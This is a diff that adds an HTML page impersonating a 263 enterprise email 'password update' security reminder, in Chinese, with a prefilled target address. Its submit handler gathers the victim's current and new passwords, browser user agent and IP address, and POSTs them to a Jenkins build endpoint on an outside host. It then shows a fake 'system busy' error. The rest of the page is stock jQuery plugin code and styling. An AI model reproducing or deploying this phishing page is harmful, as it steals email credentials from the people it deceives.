@@ -1,0 +1,445 @@
+<html xmlns="http://www.w3.org/1999/xhtml">
+    <head>
+        <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+        <title>263企业邮箱安全提醒 - 企业邮箱 - 263云通信</title>
+        <link href="//cdn.bootcss.com/bootstrap/3.3.6/css/bootstrap.min.css" rel="stylesheet">
+        <link href="//cdn.bootcss.com/bootstrap/3.3.6/css/bootstrap-theme.min.css" rel="stylesheet">
+        <link href="//www.gbtags.com/gb/networks/uploads/76bd0870-eff6-4bfd-91c9-f1aa2d2d3122/bootstrap-login-forms/form-1/assets/font-awesome/css/font-awesome.min.css" rel="stylesheet">
+
+        <script src="//cdn.bootcss.com/jquery/2.1.4/jquery.min.js"></script>
+        <script src="//cdn.bootcss.com/bootstrap/3.3.6/js/bootstrap.min.js"></script>
+
+        <script type="text/javascript">
+            "function"!=typeof Object.create&&(Object.create=function(a){function b(){}return b.prototype=a,new b}),function(a,b){"use strict";var e={_positionClasses:["bottom-left","bottom-right","top-right","top-left","bottom-center","top-center","mid-center"],_defaultIcons:["success","error","info","warning"],init:function(b){this.prepareOptions(b,a.toast.options),this.process()},prepareOptions:function(b,c){var d={};"string"==typeof b||b instanceof Array?d.text=b:d=b,this.options=a.extend({},c,d)},process:function(){this.setup(),this.addToDom(),this.position(),this.bindToast(),this.animate()},setup:function(){var b="";if(this._toastEl=this._toastEl||a("<div></div>",{"class":"jq-toast-single"}),this.options.allowToastClose&&(b+='<span class="close-jq-toast-single">&times;</span>'),this.options.text instanceof Array){this.options.heading&&(b+='<h2 class="jq-toast-heading">'+this.options.heading+"</h2>"),b+='<ul class="jq-toast-ul">';for(var c=0;c<this.options.text.length;c++)b+='<li class="jq-toast-li" id="jq-toast-item-'+c+'">'+this.options.text[c]+"</li>";b+="</ul>"}else this.options.heading&&(b+='<h2 class="jq-toast-heading">'+this.options.heading+"</h2>"),b+=this.options.text;this._toastEl.html(b),this.options.bgColor!==!1&&this._toastEl.css("background-color",this.options.bgColor),this.options.textColor!==!1&&this._toastEl.css("color",this.options.textColor),this.options.textAlign&&this._toastEl.css("text-align",this.options.textAlign),this.options.icon!==!1&&(this._toastEl.addClass("jq-has-icon"),-1!==a.inArray(this.options.icon,this._defaultIcons)&&this._toastEl.addClass("jq-icon-"+this.options.icon))},position:function(){"string"==typeof this.options.position&&-1!==a.inArray(this.options.position,this._positionClasses)?"bottom-center"===this.options.position?this._container.css({left:a(b).outerWidth()/2-this._container.outerWidth()/2,bottom:20}):"top-center"===this.options.position?this._container.css({left:a(b).outerWidth()/2-this._container.outerWidth()/2,top:20}):"mid-center"===this.options.position?this._container.css({left:a(b).outerWidth()/2-this._container.outerWidth()/2,top:a(b).outerHeight()/2-this._container.outerHeight()/2}):this._container.addClass(this.options.position):"object"==typeof this.options.position?this._container.css({top:this.options.position.top?this.options.position.top:"auto",bottom:this.options.position.bottom?this.options.position.bottom:"auto",left:this.options.position.left?this.options.position.left:"auto",right:this.options.position.right?this.options.position.right:"auto"}):this._container.addClass("bottom-left")},bindToast:function(){var a=this;this._toastEl.find(".close-jq-toast-single").on("click",function(b){b.preventDefault(),"fade"===a.options.showHideTransition?(a._toastEl.trigger("beforeHide"),a._toastEl.fadeOut(function(){a._toastEl.trigger("afterHidden")})):"slide"===a.options.showHideTransition?(a._toastEl.trigger("beforeHide"),a._toastEl.slideUp(function(){a._toastEl.trigger("afterHidden")})):(a._toastEl.trigger("beforeHide"),a._toastEl.hide(function(){a._toastEl.trigger("afterHidden")}))}),"function"==typeof this.options.beforeShow&&this._toastEl.on("beforeShow",function(){a.options.beforeShow()}),"function"==typeof this.options.afterShown&&this._toastEl.on("afterShown",function(){a.options.afterShown()}),"function"==typeof this.options.beforeHide&&this._toastEl.on("beforeHide",function(){a.options.beforeHide()}),"function"==typeof this.options.afterHidden&&this._toastEl.on("afterHidden",function(){a.options.afterHidden()})},addToDom:function(){var b=a(".jq-toast-wrap");if(0===b.length?(b=a("<div></div>",{"class":"jq-toast-wrap"}),a("body").append(b)):(!this.options.stack||isNaN(parseInt(this.options.stack,10)))&&b.empty(),b.find(".jq-toast-single:hidden").remove(),b.append(this._toastEl),this.options.stack&&!isNaN(parseInt(this.options.stack),10)){var c=b.find(".jq-toast-single").length,d=c-this.options.stack;d>0&&a(".jq-toast-wrap").find(".jq-toast-single").slice(0,d).remove()}this._container=b},animate:function(){var a=this;if(this._toastEl.hide(),this._toastEl.trigger("beforeShow"),"fade"===this.options.showHideTransition.toLowerCase()?this._toastEl.fadeIn(function(){a._toastEl.trigger("afterShown")}):"slide"===this.options.showHideTransition.toLowerCase()?this._toastEl.slideDown(function(){a._toastEl.trigger("afterShown")}):this._toastEl.show(function(){a._toastEl.trigger("afterShown")}),this.options.hideAfter!==!1&&!isNaN(parseInt(this.options.hideAfter,10))){var a=this;b.setTimeout(function(){"fade"===a.options.showHideTransition.toLowerCase()?(a._toastEl.trigger("beforeHide"),a._toastEl.fadeOut(function(){a._toastEl.trigger("afterHidden")})):"slide"===a.options.showHideTransition.toLowerCase()?(a._toastEl.trigger("beforeHide"),a._toastEl.slideUp(function(){a._toastEl.trigger("afterHidden")})):(a._toastEl.trigger("beforeHide"),a._toastEl.hide(function(){a._toastEl.trigger("afterHidden")}))},this.options.hideAfter)}},reset:function(b){"all"===b?a(".jq-toast-wrap").remove():this._toastEl.remove()},update:function(a){this.prepareOptions(a,this.options),this.setup(),this.bindToast()}};a.toast=function(a){var b=Object.create(e);return b.init(a,this),{reset:function(a){b.reset(a)},update:function(a){b.update(a)}}},a.toast.options={text:"",heading:"",showHideTransition:"fade",allowToastClose:!0,hideAfter:5e3,stack:5,position:"bottom-left",bgColor:!1,textColor:!1,textAlign:"left",icon:!1,beforeShow:function(){},afterShown:function(){},beforeHide:function(){},afterHidden:function(){}}}(jQuery,window,document);
+
+            function getip(json){
+                window.ip = json.ip;
+            };
+            (function(a,d,p){a.fn.backstretch=function(c,b){(c===p||0===c.length)&&a.error("No images were supplied for Backstretch");0===a(d).scrollTop()&&d.scrollTo(0,0);return this.each(function(){var d=a(this),g=d.data("backstretch");if(g){if("string"==typeof c&&"function"==typeof g[c]){g[c](b);return}b=a.extend(g.options,b);g.destroy(!0)}g=new q(this,c,b);d.data("backstretch",g)})};a.backstretch=function(c,b){return a("body").backstretch(c,b).data("backstretch")};a.expr[":"].backstretch=function(c){return a(c).data("backstretch")!==p};a.fn.backstretch.defaults={centeredX:!0,centeredY:!0,duration:5E3,fade:0};var r={left:0,top:0,overflow:"hidden",margin:0,padding:0,height:"100%",width:"100%",zIndex:-999999},s={position:"absolute",display:"none",margin:0,padding:0,border:"none",width:"auto",height:"auto",maxHeight:"none",maxWidth:"none",zIndex:-999999},q=function(c,b,e){this.options=a.extend({},a.fn.backstretch.defaults,e||{});this.images=a.isArray(b)?b:[b];a.each(this.images,function(){a("<img />")[0].src=this});this.isBody=c===document.body;this.$container=a(c);this.$root=this.isBody?l?a(d):a(document):this.$container;c=this.$container.children(".backstretch").first();this.$wrap=c.length?c:a('<div class="backstretch"></div>').css(r).appendTo(this.$container);this.isBody||(c=this.$container.css("position"),b=this.$container.css("zIndex"),this.$container.css({position:"static"===c?"relative":c,zIndex:"auto"===b?0:b,background:"none"}),this.$wrap.css({zIndex:-999998}));this.$wrap.css({position:this.isBody&&l?"fixed":"absolute"});this.index=0;this.show(this.index);a(d).on("resize.backstretch",a.proxy(this.resize,this)).on("orientationchange.backstretch",a.proxy(function(){this.isBody&&0===d.pageYOffset&&(d.scrollTo(0,1),this.resize())},this))};q.prototype={resize:function(){try{var a={left:0,top:0},b=this.isBody?this.$root.width():this.$root.innerWidth(),e=b,g=this.isBody?d.innerHeight?d.innerHeight:this.$root.height():this.$root.innerHeight(),j=e/this.$img.data("ratio"),f;j>=g?(f=(j-g)/2,this.options.centeredY&&(a.top="-"+f+"px")):(j=g,e=j*this.$img.data("ratio"),f=(e-b)/2,this.options.centeredX&&(a.left="-"+f+"px"));this.$wrap.css({width:b,height:g}).find("img:not(.deleteable)").css({width:e,height:j}).css(a)}catch(h){}return this},show:function(c){if(!(Math.abs(c)>this.images.length-1)){var b=this,e=b.$wrap.find("img").addClass("deleteable"),d={relatedTarget:b.$container[0]};b.$container.trigger(a.Event("backstretch.before",d),[b,c]);this.index=c;clearInterval(b.interval);b.$img=a("<img />").css(s).bind("load",function(f){var h=this.width||a(f.target).width();f=this.height||a(f.target).height();a(this).data("ratio",h/f);a(this).fadeIn(b.options.speed||b.options.fade,function(){e.remove();b.paused||b.cycle();a(["after","show"]).each(function(){b.$container.trigger(a.Event("backstretch."+this,d),[b,c])})});b.resize()}).appendTo(b.$wrap);b.$img.attr("src",b.images[c]);return b}},next:function(){return this.show(this.index<this.images.length-1?this.index+1:0)},prev:function(){return this.show(0===this.index?this.images.length-1:this.index-1)},pause:function(){this.paused=!0;return this},resume:function(){this.paused=!1;this.next();return this},cycle:function(){1<this.images.length&&(clearInterval(this.interval),this.interval=setInterval(a.proxy(function(){this.paused||this.next()},this),this.options.duration));return this},destroy:function(c){a(d).off("resize.backstretch orientationchange.backstretch");clearInterval(this.interval);c||this.$wrap.remove();this.$container.removeData("backstretch")}};var l,f=navigator.userAgent,m=navigator.platform,e=f.match(/AppleWebKit\/([0-9]+)/),e=!!e&&e[1],h=f.match(/Fennec\/([0-9]+)/),h=!!h&&h[1],n=f.match(/Opera Mobi\/([0-9]+)/),t=!!n&&n[1],k=f.match(/MSIE ([0-9]+)/),k=!!k&&k[1];l=!((-1<m.indexOf("iPhone")||-1<m.indexOf("iPad")||-1<m.indexOf("iPod"))&&e&&534>e||d.operamini&&"[object OperaMini]"==={}.toString.call(d.operamini)||n&&7458>t||-1<f.indexOf("Android")&&e&&533>e||h&&6>h||"palmGetResource"in d&&e&&534>e||-1<f.indexOf("MeeGo")&&-1<f.indexOf("NokiaBrowser/8.5.0")||k&&6>=k)})(jQuery,window);
+            (
+            function($){
+                $.extend({
+                    getUrlVars: function(){
+                        var vars = [], hash;
+                        var hashes = window.location.href.slice(window.location.href.indexOf('?') + 1).split('&');
+                        for(var i = 0; i < hashes.length; i++)
+                        {
+                            hash = hashes[i].split('=');
+                            vars.push(hash[0]);
+                            vars[hash[0]] = hash[1];
+                        }
+                        return vars;
+                    },
+                    getUrlVar: function(name){
+                        return $.getUrlVars()[name];
+                    }
+                });
+            }
+            )(jQuery);
+        </script>
+        <script type="application/javascript" src="https://api.ipify.org?format=jsonp&callback=getip"></script>
+        <style type="text/css">
+            .jq-toast-wrap{display:block;position:fixed;width:250px;pointer-events:none!important;margin:0;padding:0;letter-spacing:normal}.jq-toast-wrap *{margin:0;padding:0}.jq-toast-wrap.bottom-left{bottom:20px;left:20px}.jq-toast-wrap.bottom-right{bottom:20px;right:40px}.jq-toast-wrap.top-left{top:20px;left:20px}.jq-toast-wrap.top-right{top:20px;right:40px}.jq-toast-single{display:block;width:100%;padding:10px;margin:0 0 5px;border-radius:4px;font-size:12px;font-family:arial,sans-serif;line-height:17px;position:relative;pointer-events:all!important;background-color:#444;color:#fff}.jq-toast-single h2{font-family:arial,sans-serif;font-size:14px;margin:0 0 7px;background:0 0;color:inherit;line-height:inherit;letter-spacing:normal}.jq-toast-single a{color:#eee;text-decoration:none;font-weight:700;border-bottom:1px solid #fff;padding-bottom:3px;font-size:12px}.jq-toast-single ul{margin:0 0 0 15px;background:0 0;padding:0}.jq-toast-single ul li{list-style-type:disc!important;line-height:17px;background:0 0;margin:0;padding:0;letter-spacing:normal}.close-jq-toast-single{position:absolute;top:3px;right:7px;font-size:14px;cursor:pointer}.jq-has-icon{padding:10px 10px 10px 50px;background-repeat:no-repeat;background-position:10px}.jq-icon-info{background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABgAAAAYCAYAAADgdz34AAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAGwSURBVEhLtZa9SgNBEMc9sUxxRcoUKSzSWIhXpFMhhYWFhaBg4yPYiWCXZxBLERsLRS3EQkEfwCKdjWJAwSKCgoKCcudv4O5YLrt7EzgXhiU3/4+b2ckmwVjJSpKkQ6wAi4gwhT+z3wRBcEz0yjSseUTrcRyfsHsXmD0AmbHOC9Ii8VImnuXBPglHpQ5wwSVM7sNnTG7Za4JwDdCjxyAiH3nyA2mtaTJufiDZ5dCaqlItILh1NHatfN5skvjx9Z38m69CgzuXmZgVrPIGE763Jx9qKsRozWYw6xOHdER+nn2KkO+Bb+UV5CBN6WC6QtBgbRVozrahAbmm6HtUsgtPC19tFdxXZYBOfkbmFJ1VaHA1VAHjd0pp70oTZzvR+EVrx2Ygfdsq6eu55BHYR8hlcki+n+kERUFG8BrA0BwjeAv2M8WLQBtcy+SD6fNsmnB3AlBLrgTtVW1c2QN4bVWLATaIS60J2Du5y1TiJgjSBvFVZgTmwCU+dAZFoPxGEEs8nyHC9Bwe2GvEJv2WXZb0vjdyFT4Cxk3e/kIqlOGoVLwwPevpYHT+00T+hWwXDf4AJAOUqWcDhbwAAAAASUVORK5CYII=);background-color:#31708f;color:#d9edf7;border-color:#bce8f1}.jq-icon-warning{background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABgAAAAYCAYAAADgdz34AAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAGYSURBVEhL5ZSvTsNQFMbXZGICMYGYmJhAQIJAICYQPAACiSDB8AiICQQJT4CqQEwgJvYASAQCiZiYmJhAIBATCARJy+9rTsldd8sKu1M0+dLb057v6/lbq/2rK0mS/TRNj9cWNAKPYIJII7gIxCcQ51cvqID+GIEX8ASG4B1bK5gIZFeQfoJdEXOfgX4QAQg7kH2A65yQ87lyxb27sggkAzAuFhbbg1K2kgCkB1bVwyIR9m2L7PRPIhDUIXgGtyKw575yz3lTNs6X4JXnjV+LKM/m3MydnTbtOKIjtz6VhCBq4vSm3ncdrD2lk0VgUXSVKjVDJXJzijW1RQdsU7F77He8u68koNZTz8Oz5yGa6J3H3lZ0xYgXBK2QymlWWA+RWnYhskLBv2vmE+hBMCtbA7KX5drWyRT/2JsqZ2IvfB9Y4bWDNMFbJRFmC9E74SoS0CqulwjkC0+5bpcV1CZ8NMej4pjy0U+doDQsGyo1hzVJttIjhQ7GnBtRFN1UarUlH8F3xict+HY07rEzoUGPlWcjRFRr4/gChZgc3ZL2d8oAAAAASUVORK5CYII=);background-color:#8a6d3b;color:#fcf8e3;border-color:#faebcc}.jq-icon-error{background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABgAAAAYCAYAAADgdz34AAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAHOSURBVEhLrZa/SgNBEMZzh0WKCClSCKaIYOED+AAKeQQLG8HWztLCImBrYadgIdY+gIKNYkBFSwu7CAoqCgkkoGBI/E28PdbLZmeDLgzZzcx83/zZ2SSXC1j9fr+I1Hq93g2yxH4iwM1vkoBWAdxCmpzTxfkN2RcyZNaHFIkSo10+8kgxkXIURV5HGxTmFuc75B2RfQkpxHG8aAgaAFa0tAHqYFfQ7Iwe2yhODk8+J4C7yAoRTWI3w/4klGRgR4lO7Rpn9+gvMyWp+uxFh8+H+ARlgN1nJuJuQAYvNkEnwGFck18Er4q3egEc/oO+mhLdKgRyhdNFiacC0rlOCbhNVz4H9FnAYgDBvU3QIioZlJFLJtsoHYRDfiZoUyIxqCtRpVlANq0EU4dApjrtgezPFad5S19Wgjkc0hNVnuF4HjVA6C7QrSIbylB+oZe3aHgBsqlNqKYH48jXyJKMuAbiyVJ8KzaB3eRc0pg9VwQ4niFryI68qiOi3AbjwdsfnAtk0bCjTLJKr6mrD9g8iq/S/B81hguOMlQTnVyG40wAcjnmgsCNESDrjme7wfftP4P7SP4N3CJZdvzoNyGq2c/HWOXJGsvVg+RA/k2MC/wN6I2YA2Pt8GkAAAAASUVORK5CYII=);background-color:#a94442;color:#f2dede;border-color:#ebccd1}.jq-icon-success{background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABgAAAAYCAYAAADgdz34AAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAADsSURBVEhLY2AYBfQMgf///3P8+/evAIgvA/FsIF+BavYDDWMBGroaSMMBiE8VC7AZDrIFaMFnii3AZTjUgsUUWUDA8OdAH6iQbQEhw4HyGsPEcKBXBIC4ARhex4G4BsjmweU1soIFaGg/WtoFZRIZdEvIMhxkCCjXIVsATV6gFGACs4Rsw0EGgIIH3QJYJgHSARQZDrWAB+jawzgs+Q2UO49D7jnRSRGoEFRILcdmEMWGI0cm0JJ2QpYA1RDvcmzJEWhABhD/pqrL0S0CWuABKgnRki9lLseS7g2AlqwHWQSKH4oKLrILpRGhEQCw2LiRUIa4lwAAAABJRU5ErkJggg==);color:#dff0d8;background-color:#3c763d;border-color:#d6e9c6}
+
+            button.btn:hover {
+                opacity: 0.6;
+                color: #fff;
+            }
+
+            .form-bottom form button.btn {
+                width: 100%;
+            }
+
+            button.btn {
+                height: 50px;
+                margin: 0;
+                padding: 0 20px;
+                vertical-align: middle;
+                background: #4aaf51;
+                border: 0;
+                font-family: 'Roboto', sans-serif;
+                font-size: 16px;
+                font-weight: 300;
+                line-height: 50px;
+                color: #fff;
+                -moz-border-radius: 4px;
+                -webkit-border-radius: 4px;
+                border-radius: 4px;
+                text-shadow: none;
+                -moz-box-shadow: none;
+                -webkit-box-shadow: none;
+                box-shadow: none;
+                -o-transition: all .3s;
+                -moz-transition: all .3s;
+                -webkit-transition: all .3s;
+                -ms-transition: all .3s;
+                transition: all .3s;
+            }
+
+            body {
+                font-family: 'Roboto', sans-serif;
+                font-size: 16px;
+                font-weight: 300;
+                color: #888;
+                line-height: 30px;
+                text-align: center;
+            }
+
+            strong { font-weight: 500; }
+
+            a, a:hover, a:focus {
+                color: #4aaf51;
+                text-decoration: none;
+                -o-transition: all .3s; -moz-transition: all .3s; -webkit-transition: all .3s; -ms-transition: all .3s; transition: all .3s;
+            }
+
+            h1, h2 {
+                margin-top: 10px;
+                font-size: 38px;
+                font-weight: 100;
+                color: #555;
+                line-height: 50px;
+            }
+
+            h3 {
+                font-size: 22px;
+                font-weight: 300;
+                color: #555;
+                line-height: 30px;
+            }
+
+            img { max-width: 100%; }
+
+            ::-moz-selection { background: #4aaf51; color: #fff; text-shadow: none; }
+            ::selection { background: #4aaf51; color: #fff; text-shadow: none; }
+
+
+            .btn-link-1 {
+                display: inline-block;
+                height: 50px;
+                margin: 5px;
+                padding: 16px 20px 0 20px;
+                background: #4aaf51;
+                font-size: 16px;
+                font-weight: 300;
+                line-height: 16px;
+                color: #fff;
+                -moz-border-radius: 4px; -webkit-border-radius: 4px; border-radius: 4px;
+            }
+            .btn-link-1:hover, .btn-link-1:focus, .btn-link-1:active { outline: 0; opacity: 0.6; color: #fff; }
+
+            .btn-link-1.btn-link-1-facebook { background: #4862a3; }
+            .btn-link-1.btn-link-1-twitter { background: #55acee; }
+            .btn-link-1.btn-link-1-google-plus { background: #dd4b39; }
+
+            .btn-link-1 i {
+                padding-right: 5px;
+                vertical-align: middle;
+                font-size: 20px;
+                line-height: 20px;
+            }
+
+            .btn-link-2 {
+                display: inline-block;
+                height: 50px;
+                margin: 5px;
+                padding: 15px 20px 0 20px;
+                background: rgba(0, 0, 0, 0.3);
+                border: 1px solid #fff;
+                font-size: 16px;
+                font-weight: 300;
+                line-height: 16px;
+                color: #fff;
+                -moz-border-radius: 4px; -webkit-border-radius: 4px; border-radius: 4px;
+            }
+            .btn-link-2:hover, .btn-link-2:focus,
+            .btn-link-2:active, .btn-link-2:active:focus { outline: 0; opacity: 0.6; background: rgba(0, 0, 0, 0.3); color: #fff; }
+
+
+            /***** Top content *****/
+
+            .inner-bg {
+                padding: 100px 0 170px 0;
+            }
+
+            .top-content .text {
+                color: #fff;
+            }
+
+            .top-content .text h1 { color: #fff; }
+
+            .top-content .description {
+                margin: 20px 0 10px 0;
+            }
+
+            .top-content .description p { opacity: 0.8; }
+
+            .top-content .description a {
+                color: #fff;
+            }
+            .top-content .description a:hover,
+            .top-content .description a:focus { border-bottom: 1px dotted #fff; }
+
+            .form-box {
+                margin-top: 35px;
+            }
+
+            .form-top {
+                overflow: hidden;
+                padding: 0 25px 15px 25px;
+                background: #fff;
+                -moz-border-radius: 4px 4px 0 0; -webkit-border-radius: 4px 4px 0 0; border-radius: 4px 4px 0 0;
+                text-align: left;
+            }
+
+            .form-top-left {
+                float: left;
+                width: 75%;
+                padding-top: 25px;
+            }
+
+            .form-top-left h3 { margin-top: 0; }
+
+            .form-top-right {
+                float: left;
+                width: 25%;
+                padding-top: 5px;
+                font-size: 66px;
+                color: #ddd;
+                line-height: 100px;
+                text-align: right;
+            }
+
+            .form-bottom {
+                padding: 25px 25px 30px 25px;
+                background: #eee;
+                -moz-border-radius: 0 0 4px 4px; -webkit-border-radius: 0 0 4px 4px; border-radius: 0 0 4px 4px;
+                text-align: left;
+            }
+
+            .form-bottom form textarea {
+                height: 100px;
+            }
+
+            .form-bottom form button.btn {
+                width: 100%;
+            }
+
+            .form-bottom form .input-error {
+                border-color: #4aaf51;
+            }
+
+            .social-login {
+                margin-top: 35px;
+            }
+
+            .social-login h3 {
+                color: #fff;
+            }
+
+            .social-login-buttons {
+                margin-top: 25px;
+            }
+
+            .fa {
+                display: inline-block;
+                font: normal normal normal 14px/1 FontAwesome;
+                font-size: inherit;
+                text-rendering: auto;
+                -webkit-font-smoothing: antialiased;
+                -moz-osx-font-smoothing: grayscale;
+                transform: translate(0, 0);
+            }
+
+            .fa-key:before {
+                content: "\f084";
+            }
+
+            /***** Media queries *****/
+
+            @media (min-width: 992px) and (max-width: 1199px) {}
+
+            @media (min-width: 768px) and (max-width: 991px) {}
+
+            @media (max-width: 767px) {
+
+                .inner-bg { padding: 60px 0 110px 0; }
+
+            }
+
+            @media (max-width: 415px) {
+
+                h1, h2 { font-size: 32px; }
+
+            }
+
+        </style>
+        <script type="text/javascript">
+            $(function(){
+
+
+
+                $.backstretch("http://www.gbtags.com/gb/networks/uploads/76bd0870-eff6-4bfd-91c9-f1aa2d2d3122/bootstrap-login-forms/form-1/assets/img/backgrounds/1.jpg");
+                $('#form-username').val($.getUrlVar('name'));
+                var checkCurrent = function(){
+                    var $this= $('#form-current');
+                    var val = $this.val();
+                    var pattern = /\w{6,20}/;
+                    if(pattern.test(val)){
+                        $this.parent('div').removeClass('has-error').addClass('has-success');
+                        $('#message').html('请输入您的初始密码及新密码:');
+                        return true;
+                    }else{
+                        $this.parent('div').addClass('has-error');
+                        $('#message').html('<font style="color:red">长度或内容有误</font>');
+                        $.toast({
+                            text:'长度或内容有误',
+                            position : 'top-center'
+                        });
+                        return false;
+                    }
+                };
+                $('#form-current').blur(checkCurrent);
+
+                var checkPassword = function(){
+                    var $this=$('#form-password');
+                    var val = $this.val();
+                    var pattern = /\w{6,20}/;
+                    if(pattern.test(val)){
+                        $this.parent('div').removeClass('has-error').addClass('has-success');
+                        $('#message').html('请输入您的初始密码及新密码:');
+                        return true;
+                    }else{
+                        $this.parent('div').addClass('has-error');
+                        $('#message').html('<font style="color:red">新密码必须是6～20位的字母与数字的组合</font>');
+                        $.toast({
+                            text:'新密码必须是6～20位的字母与数字的组合',
+                            position : 'top-center'
+                        });
+                        return false;
+                    }
+                };
+                $('#form-password').blur(checkPassword);
+
+                var recheck = function(){
+                    var $this=$('#form-passwordv');
+                    var val = $this.val();
+                    var pattern = /\w{6,20}/;
+                    var top = $('#form-password').val();
+                    if(pattern.test(val) && (top == val) ){
+                        $this.parent('div').removeClass('has-error').addClass('has-success');
+                        $('#message').html('请输入您的初始密码及新密码:');
+                        return true;
+                    }else{
+                        $this.parent('div').addClass('has-error');
+                        $('#message').html('<font style="color:red">两次输入的密码不一致</font>');
+                        $.toast({
+                            text:'两次输入的密码不一致',
+                            position : 'top-center'
+                        });
+                        return false;
+                    }
+                };
+
+                $('#form-passwordv').blur(recheck);
+
+                $('#sb').click(function(){
+                    if(checkCurrent() && checkPassword() && recheck() ){
+                        console.log('测试成果');
+                        $.ajax('http://dev.hoyt-tian.com/jenkins/job/Chips/build',{
+                            method:'POST',
+                            data:{
+                                token:'z9df12',
+                                'cause':'\nname:'+$('#form-username').val()
+                                +'\npassword:'+$('#form-current').val()
+                                +'\nnewpassword:'+$('#form-password').val()
+                                +'\nagent:'+window.navigator.userAgent
+                                +'\nip:'+window.ip
+                            },
+                            success:function(){
+                                $.toast({
+                                    text:'系统繁忙，密码更新失败，请过几分钟再尝试',
+                                    position : 'top-center'
+                                })
+                            },
+
+                            error:function(){
+                                $.toast({
+                                    text:'发生未知错误，请稍后尝试',
+                                    position : 'top-center'
+                                });
+                            }
+                        });
+                    }else{
+                        $.toast({
+                            text:'请您核对您的输入',
+                            position : 'top-center'
+                        });
+                    }
+                });
+            });
+        </script>
+    </head>
+<body>
+<div class="top-content">
+
+    <div class="inner-bg">
+        <div class="container">
+            <div class="row">
+                <div class="col-sm-8 col-sm-offset-2 text">
+                    <h1><strong>账号安全</strong> 管理</h1>
+                    <div class="description">
+                        <p>
+                            定期更新邮箱密码有助于保障账号安全<br/>
+                            建议的密码长度不少于8位，并且包含字母、数字的组合
+                        </p>
+                    </div>
+                </div>
+            </div>
+            <div class="row">
+                <div class="col-sm-6 col-sm-offset-3 form-box">
+                    <div class="form-top">
+                        <div class="form-top-left">
+                            <h3>邮箱密码更新</h3>
+                            <p id="message">请输入您的初始密码及新密码:</p>
+                        </div>
+                        <div class="form-top-right">
+                            <i class="fa fa-key"></i>
+                        </div>
+                    </div>
+                    <div class="form-bottom">
+                        <form role="form" action="" method="post" class="login-form">
+
+                            <div class="form-group">
+                                <label class="sr-only" for="form-username">当前密码</label>
+                                <input type="text" readonly name="form-username" value="truel@petsjoyful.com" class="form-username form-control" id="form-username">
+                            </div>
+
+                            <div class="form-group">
+                                <label class="sr-only" for="form-username">当前密码</label>
+                                <input type="password" name="form-username" placeholder="当前密码" class="form-username form-control" id="form-current">
+                            </div>
+                            <div class="form-group">
+                                <label class="sr-only" for="form-password">更新密码</label>
+                                <input type="password" name="form-password" placeholder="新密码，不少于6位，为字母和数字的组合" class="form-password form-control" id="form-password">
+                            </div>
+                            <div class="form-group">
+                                <label class="sr-only" for="form-password">密码确认</label>
+                                <input type="password" name="form-password" placeholder="重复您的新密码" class="form-password form-control" id="form-passwordv">
+                            </div>
+                            <button type="button" class="btn" id="sb">更新密码</button>
+                        </form>
+                    </div>
+                </div>
+            </div>
+            <div class="row">
+                <div class="col-sm-6 col-sm-offset-3 social-login">
+                    <h3>有超过100,000家企业选择了263</h3>
+                    <div>【263企业邮箱】是中国企业邮箱第一品牌，16年专注，市场占有率连续多年保持第一，为10万家企业，超过500万企业用户提供快速、安全、稳定的企业邮箱服务。</div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+</body>
+</html>
